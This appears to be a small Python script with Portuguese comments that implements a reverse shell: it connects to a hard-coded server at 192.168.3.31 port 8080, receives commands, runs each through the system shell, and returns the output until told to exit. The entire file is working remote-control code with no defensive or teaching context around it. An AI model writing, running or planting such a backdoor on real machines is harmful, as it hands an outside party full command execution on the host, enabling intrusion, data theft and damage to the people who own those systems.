import socket
import subprocess

HOST = '192.168.3.31'  # Endereço IP do servidor
PORT = 8080        # Porta para se conectar

# Crie um socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Receba comandos do servidor e execute-os
while True:
    command = s.recv(1024).decode()
    if 'exit' in command:
        break
    else:
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        s.send(output_str.encode())
#testeee
# Feche a conexão
s.close()
